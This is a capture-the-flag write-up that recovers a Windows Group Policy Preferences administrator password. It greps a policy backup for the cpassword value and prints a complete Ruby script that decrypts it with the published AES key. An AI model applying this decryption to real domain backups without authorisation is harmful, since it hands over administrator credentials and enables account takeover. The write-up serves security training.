##### [I lost my password](http://ringzer0team.com/challenges/51)
##### Answer

Unarchive file after downloading:  
```
  $ tar xf d22fdb09ef96576dfc49076a9322a555.tar 
```  
As you see we have a directory named Policies that is [`group policy`](http://en.wikipedia.org/wiki/Group_Policy) backup, We are looking for `password` so we simply use `grep` command to do that:  
```
  $ grep -R -i 'pass'  Policies/*
  Policies/{75DE8F0A-DEC0-441F-AE29-90DFAFCF632B}/User/Preferences/Groups/Groups.xml:<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (built-in)" image="1" changed="2014-02-06 19:33:28" uid="{C73C0939-38FB-4287-AC48-478F614F5EF7}" userContext="0" removePolicy="0"><Properties action="R" fullName="Administrator" description="Administrator" cpassword="PCXrmCkYWyRRx3bf+zqEydW9/trbFToMDx6fAvmeCDw" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" subAuthority="" userName="Administrator (built-in)"/></User>
```
No we [know](http://blog.csnc.ch/2012/04/exploit-credentials-stored-in-windows-group-policy-preferences/) the `cpassword="PCXrmCkYWyRRx3bf+zqEydW9/trbFToMDx6fAvmeCDw"` meaning. So we must use a code to find the cipher text from hased cpassword.  
Here is a sample code using ruby to decode the password:  
```
  require 'rubygems'
  require 'openssl'
  require 'base64'

  encrypted_data = "PCXrmCkYWyRRx3bf+zqEydW9/trbFToMDx6fAvmeCDw"

  def decrypt(encrypted_data)
    padding = "=" * (4 - (encrypted_data.length % 4))
    epassword = "#{encrypted_data}#{padding}"
    decoded = Base64.decode64(epassword)

     key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
    aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
    aes.decrypt
    aes.key = key
    plaintext = aes.update(decoded)
    plaintext << aes.final
    pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion

     return pass
   end
   
  blah = decrypt(encrypted_data)
  puts blah
```  
Now we save the code as `gpp-decrypt-string.rb` and run it in terminal:  
```
  $ ruby gpp-decrypt-string.rb
  LocalRoot!
```  
So the flag is `LocalRoot!`.  

